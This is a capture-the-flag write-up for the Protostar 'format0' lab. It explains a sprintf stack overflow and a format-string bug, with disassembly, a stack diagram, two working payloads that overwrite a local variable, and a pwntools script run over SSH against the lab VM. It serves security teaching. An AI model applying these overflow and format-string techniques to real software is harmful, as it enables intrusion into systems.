# Format 0


```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Goal: overwrite the content of the target variable with 0xdeadbeef

sprintf is a libc function , very similar to printf because we can use format 
specifier. sprintf will store the output in the first argument whereas printf will output the result in
the standard output.


ex: 
```c
char ptr_buff[]="Jeyanthan !!!!";
char buffer[255];
sprintf(buffer, "Hello %s", ptr_buff);
printf("buffer: %s\n",buffer);
```
This will output:  Hello Jeyanthan !!!!

In our case we want to overwrite the content of **target**, so potentially we can overflow **buffer** and 
then overflow **target** .


# static analysis: 

```asm
0x080483f4 <vuln+0>:	push   ebp
0x080483f5 <vuln+1>:	mov    ebp,esp
0x080483f7 <vuln+3>:	sub    esp,0x68
0x080483fa <vuln+6>:	mov    DWORD PTR [ebp-0xc],0x0  <-- 'target' is at ebp-0xc
0x08048401 <vuln+13>:	mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:	mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:	lea    eax,[ebp-0x4c]  <-- eax points on buffer (ebp-0x4c)
0x0804840b <vuln+23>:	mov    DWORD PTR [esp],eax   
0x0804840e <vuln+26>:	call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:	cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:	jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:	mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:	call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:	leave  
0x0804842a <vuln+54>:	ret 

```

The stack looks like this : 



```
|  -----------------
|    Seip
|  -----------------
|   Sebp 
|  ----------------- 
|                    
|  ----------------- ebp-0x4
|
|  ----------------- ebp-0x8
|    TARGET
|  ----------------- ebp-0xc
|      ....... 
|  
|  -----------------
|
|    BUFFER
|  ----------------- ebp-0x4c
|
|
v

```

We need : 
(ebp-0x4c) +  ?? = (ebp-0xc)
<=> -0xc + 0x4c = 64 

We need to fill 'buffer' with 64 bytes and overwrite the next 4 bytes with 0xdeadbeef

# payload 1:

```bash
user@protostar:~$ /opt/protostar/bin/format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
you have hit the target correctly :)

```


An other way to exploit it is to use format specifier 


# payload 2: 

```bash
user@protostar:~$ /opt/protostar/bin/format0 `echo -e "%64x\xef\xbe\xad\xde"`
you have hit the target correctly :)

```

%64x will padd with 64 caracters (spaces + what is found on the stack in hex) in buffer
ex:
```c
#include <stdio.h>

int main(){

    printf("%64xHello");
}

Output: 
                                                        ffffd134Hello
----------------------------------------------------------------|  after 64 bytes Hello




```

It's not mandatory to use %x. 
We can use other specifier for the padding like %d,%c ...

# solution with pwntools :

```python
from pwn import *


r = ssh(host="192.168.160.128" , user="user", password="user")

payload = b"%64x" + p32(0xdeadbeef)

prg = r.run(['/opt/protostar/bin/format0', payload])
print(prg.recv())

```